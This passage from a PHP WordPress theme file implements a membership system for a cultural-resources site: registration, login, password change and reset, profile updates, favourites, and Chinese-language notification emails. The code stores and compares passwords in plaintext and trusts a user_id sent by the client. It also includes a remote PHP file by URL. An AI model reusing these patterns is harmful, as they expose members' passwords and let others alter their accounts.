	$mailResult= wp_mail( $to, $subject, $body, $headers );


}

function add_to_fav($request)
{
	$user_id = $request['user_id'];
	$post_id = $request['post_id'];
	$action=$request['action'];

	if($action=='add')
	{
		$list = get_field( "fav_articles", $user_id );
	    $list_arr = explode (",", $list); 
		if (!in_array($post_id, $list_arr))
		{
			
			$list.= ','.$post_id;
			if($list[0]==',')
			{
				$list=substr($list, 1);
			}
		}
		update_post_meta( $user_id, 'fav_articles',$list );

	}

	if($action=='remove')
	{
		$list = get_field( "fav_articles", $user_id );
	    $list_arr = explode (",", $list); 
		$new_list_arr=[];
		for($i=0;$i<count($list_arr);$i++)
		{
			if($list_arr[$i]!=$post_id)
			{	
				array_push($new_list_arr, $list_arr[$i]);
			}	
		}
		update_post_meta( $user_id, 'fav_articles',implode(',', $new_list_arr) );
	}

	

	// if (in_array($post_id, $list_arr))
	// {

	// }
	// else
	// {

	// }

	// update_post_meta( $user_id, 'fav_articles',$post_id );

	echo json_encode(array("status"=>"1", "msg"=>"added to fav"));		

	// $args = array(
	// 	'p'=> $user_id,
	// 	'post_type'  => 'member',
	// );
	
	// $query = new WP_Query( $args );
	
	// if($query->have_posts())
	// {

	// }
	

}


function updatepw($request)
{
	$user_id = $request['user_id'];
$oldpassword =$request['oldpassword'];
$newpassword =$request['newpassword'];

$args = array(
	'p'=> $user_id,
	'post_type'  => 'member',
	'meta_query' => array(
		array(
			'key'     => 'password',
			'value'   => $oldpassword,
		)
	),
);

$query = new WP_Query( $args );



if($query->have_posts())
{
	update_post_meta( $user_id, 'reset_pw_verification_code','' );


	update_post_meta( $user_id, 'password', $newpassword );
	echo json_encode(array("status"=>"1", "msg"=>"user pw is updated"));	
	

	$to= get_field('email',$user_id);
	$subject= '您在視角文化資源會員的密碼已經更改';


	$body= '<!DOCTYPE html><html lang="en"><head> <meta charset="UTF-8" /> <meta http-equiv="X-UA-Compatible" content="IE=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <title>Document</title></head><body> <div style="text-align: center; margin-top: 30px"> <a href="https://perspectivecr.org/"> <img style="height: 66px" src="https://perspectivecr.org/wp-content/themes/pcr/assets/images/logo.png" alt="" /></a> <br /><br /><span style="font-size: 16px; font-weight: bold"> '.get_field('account_name',$user_id).' 您好︰</span > <br /><br /> 此通知用於確認您在視角文化資源會員的密碼已經更改。<br /> 如果你並未更改你的密碼，請與網站管理員聯絡︰ <a href="mailto:info@perspectivecr.org" target="_blank" style="text-decoration: none; color: #000" >info@perspectivecr.org</a > <br /> <br />感謝您的使用與支持。 <br /><br /><br />視角文化資源 <br /> <br /> <a href="https://www.perspectivecr.org/" target="_blank" style="text-decoration: none; margin: 0 2px"> <img style="height: 18px" src="https://perspectivecr.org/wp-content/uploads/2021/05/edm-icon-1.png" alt="" /> </a> <a href="https://www.facebook.com/%E8%A6%96%E8%A7%92%E6%96%87%E5%8C%96-100798228820297" target="_blank" style="text-decoration: none; margin: 0 2px"> <img style="height: 18px" src="https://perspectivecr.org/wp-content/uploads/2021/05/edm-icon-2.png" alt="" /> </a> <a href="https://www.instagram.com/pers.cul/" target="_blank" style="text-decoration: none; margin: 0 2px"> <img style="height: 18px" src="https://perspectivecr.org/wp-content/uploads/2021/05/edm-icon-3.png" alt="" /> </a> </div> </body></html>';
	$headers = array('Content-Type: text/html; charset=UTF-8');
	$mailResult = false;
	$mailResult= wp_mail( $to, $subject, $body, $headers );




}
else
{
	echo json_encode(array("status"=>"-1", "msg"=>"old password is wrong"));		

}
	


}


function updateinfo($request)
{
	$user_id = $request['user_id'];
	$tel = $request['tel'];
	$address = $request['address'];
	$age = $request['age'];
	$child = $request['child'];

	$subscribe_info= $request['subscribe_info'];
	$subscribe_info_other= $request['subscribe_info_other'];

	

	$captcha = $request['captcha'];

	if($captcha !=$_SESSION['captcha']['code'])
	{
		echo json_encode(array("status"=>"-1", "msg"=>"captcha is not matched"));		
	}
	else
	{
		update_post_meta( $user_id, 'age', $age );
		update_post_meta( $user_id, 'child', $child );
		update_post_meta( $user_id, 'subscribe_info', $subscribe_info );

		update_post_meta( $user_id, 'subscribe_info_other', $subscribe_info_other );

		// $subscribe_info= $request['subscribe_info'];
		// $subscribe_info_other= $request['subscribe_info_other[]'];
	

		update_post_meta( $user_id, 'address', $address );
		update_post_meta( $user_id, 'tel', $tel );
		echo json_encode(array("status"=>"1", "msg"=>"user info is updated"));		

	}


}
function forgetpw($request)
{

	
	$email = $request['email'];

	$search_account = get_posts(array(
		'post_type'		=> 'member',
		'meta_key'		=> 'email',
		'meta_value'	=> $email
	));
		
	if($search_account)
	{
		$member_id = $search_account[0]->ID;

		$to= $email;
		$subject= '視角文化資源已收到您重設密碼的要求';
		$code = uniqid();

		update_post_meta( $member_id, 'reset_pw_verification_code', $code );

		$body= '<!DOCTYPE html><html lang="en"><head> <meta charset="UTF-8" /> <meta http-equiv="X-UA-Compatible" content="IE=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <title>Document</title></head><body> <div style="text-align: center; margin-top: 30px"> <a href="https://perspectivecr.org/"> <img style="height: 66px" src="https://perspectivecr.org/wp-content/themes/pcr/assets/images/logo.png" alt="" /></a> <br /><br /><span style="font-size: 16px; font-weight: bold"> '.get_field('account_name',$member_id).' 您好︰</span > <br /><br /> 視角文化資源已收到您重設密碼的要求，欲重設您的密碼，請按下面連結︰ <br /> '.get_site_url().'/member-reset-pw/?u='.$member_id.'&c='.$code.' <br /> <br />感謝您的使用與支持。 <br /><br /><br />視角文化資源 <br /> <br /> <a href="https://www.perspectivecr.org/" target="_blank" style="text-decoration: none; margin: 0 2px"> <img style="height: 18px" src="https://perspectivecr.org/wp-content/uploads/2021/05/edm-icon-1.png" alt="" /> </a> <a href="https://www.facebook.com/%E8%A6%96%E8%A7%92%E6%96%87%E5%8C%96-100798228820297" target="_blank" style="text-decoration: none; margin: 0 2px"> <img style="height: 18px" src="https://perspectivecr.org/wp-content/uploads/2021/05/edm-icon-2.png" alt="" /> </a> <a href="https://www.instagram.com/pers.cul/" target="_blank" style="text-decoration: none; margin: 0 2px"> <img style="height: 18px" src="https://perspectivecr.org/wp-content/uploads/2021/05/edm-icon-3.png" alt="" /> </a> </div> </body></html>';
		$headers = array('Content-Type: text/html; charset=UTF-8');
		$mailResult = false;
		$mailResult= wp_mail( $to, $subject, $body, $headers );


		echo json_encode(array("status"=>"1", "msg"=>"reset pw email was sent"));		
	}
	else

	{
		echo json_encode(array("status"=>"-1", "msg"=>"email is not registered"));		

	}
	

}


function register($request)
{

	$account_name = $request['account_name'];
	$email = $request['email'];
	$tel = $request['tel'];
	$address = $request['address'];
	$password = $request['password'];
	$captcha = $request['captcha'];
	$reject_promote_1=$request['reject_promote_1'];
	$reject_promote_2=$request['reject_promote_2'];
	$child=$request['child'];
	$age=$request['age'];

	$subscribe_info= $request['subscribe_info'];
	$subscribe_info_other= $request['subscribe_info_other'];

	// print_r($subscribe_info);
	// echo 1119;
	// echo $subscribe_info_other;
	
	
	// subscribe_info: subscribe_info_arr,
	// subscribe_other: subscribe_other,


	$search_account = get_posts(array(
		'post_type'		=> 'member',
		'meta_key'		=> 'email',
		'meta_value'	=> $email
	));
	
	if($search_account)
	{
		echo json_encode(array("status"=>"0", "msg"=>"member exists!"));		
	}
	else
	{
		// echo $captcha.'!!'.$_SESSION['captcha']['code'];
		if($captcha !=$_SESSION['captcha']['code'])
		{
			echo json_encode(array("status"=>"-1", "msg"=>"captcha is not matched"));		
		}
		else
		{
				// insert the post and set the category
				$post_id = wp_insert_post(array (
					'post_type' => 'member',
					'post_title' => $account_name,
					'post_status' => 'publish'
				));

				if ($post_id) {
					add_post_meta($post_id, 'account_name', $account_name);
					add_post_meta($post_id, 'reject_promote_1', $reject_promote_1);
					add_post_meta($post_id, 'reject_promote_2', $reject_promote_2);
					add_post_meta($post_id, 'age', $age);
					add_post_meta($post_id, 'child', $child);

					add_post_meta($post_id, 'subscribe_info', $subscribe_info);
					add_post_meta($post_id, 'subscribe_info_other', $subscribe_info_other);

					add_post_meta($post_id, 'email', $email);
					add_post_meta($post_id, 'tel', $tel);
					add_post_meta($post_id, 'address', $address);
					add_post_meta($post_id, 'password', $password);
					add_post_meta($post_id, 'verified_email', false);
					$code = uniqid();
					add_post_meta($post_id, 'email_verification_code', $code);

					echo json_encode(array("status"=>"1", "msg"=>"member created!"));		

					$to= $email;
					$subject= '啟動您的視角文化資源會員';
					// $body= '進按下面的連結進行新會員認證：<br/>'.get_site_url().'/member-activate/?u='.$post_id.'&c='.$code;
					$body='<!DOCTYPE html><html lang="en"><head> <meta charset="UTF-8" /> <meta http-equiv="X-UA-Compatible" content="IE=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <title>Document</title></head><body> <div style="text-align: center; margin-top: 30px"> <a href="https://perspectivecr.org/"> <img style="height: 66px" src="https://perspectivecr.org/wp-content/themes/pcr/assets/images/logo.png" alt="" /></a> <br /><br /><span style="font-size: 16px; font-weight: bold"> '.$account_name.' 您好︰</span > <br /><br /> 多謝您支持，並已成功登記成為視角文化資源會員。 <br /> <br /> 請立即按下面連結啟動您的帳戶 <br /> <br /> '.get_site_url().'/member-activate/?u='.$post_id.'&c='.$code.' <br /><br /><br /> 感謝您的使用與支持。 <br /><br /><br />視角文化資源 <br /> <br /> <a href="https://www.perspectivecr.org/" target="_blank" style="text-decoration: none; margin: 0 2px"> <img style="height: 18px" src="https://perspectivecr.org/wp-content/uploads/2021/05/edm-icon-1.png" alt="" /> </a> <a href="https://www.facebook.com/視角文化-100798228820297" style="text-decoration: none; margin: 0 2px"> <img style="height: 18px" src="https://perspectivecr.org/wp-content/uploads/2021/05/edm-icon-2.png" alt="" /> </a> <a href="https://www.instagram.com/pers.cul/" target="_blank" style="text-decoration: none; margin: 0 2px"> <img style="height: 18px" src="https://perspectivecr.org/wp-content/uploads/2021/05/edm-icon-3.png" alt="" /> </a> </div> </body></html>';
					$headers = array('Content-Type: text/html; charset=UTF-8');
					$mailResult = false;
					$mailResult= wp_mail( $to, $subject, $body, $headers );


				}
				



					
		}
		
	}
	
}



function member_login($request)
{
	$email = $request['email'];
	$password = $request['password'];
	$from_post = $request['from_post'];

	$args = array(
		'post_type'  => 'member',
		'meta_query' => array(
			array(
				'key'     => 'email',
				'value'   => $email,
			),
			array(
				'key'     => 'password',
				'value'   => $password,
			),
		),
	);
	// echo $email.'!!'.$password;
	$query = new WP_Query( $args );

	if($query->have_posts())
	{
		// echo 9999;
		$query->the_post();

		// echo get_the_ID();
		$_SESSION['user_id'] = get_the_ID();

		echo json_encode(array("status"=>"1", "msg"=>"login successfully","from_post"=>$from_post));		
	}
	else
	{
		echo json_encode(array("status"=>"-1", "msg"=>"login fail"));		
	}
	
	

}


//Page Slug Body Class
function add_slug_body_class( $classes ) {
	global $post;
	if ( isset( $post ) ) {
	$classes[] = $post->post_type . '-' . $post->post_name;
	}
	return $classes;
	}
	add_filter( 'body_class', 'add_slug_body_class' );
	

	function app_output_buffer() {
		ob_start();
	} // soi_output_buffer
	add_action('init', 'app_output_buffer');



	require('https://perspectivecr.org/traffic/db-config.php');
	
	

/* http://biostall.com/hashing-acf-password-type-fields-in-wordpress/ */
// function ns_function_encrypt_passwords( $value, $post_id, $field  )
// {
//     $value = wp_hash_password( $value );
 
//     return $value;
// }
// add_filter('acf/update_value/type=password', 'ns_function_encrypt_passwords', 10, 3);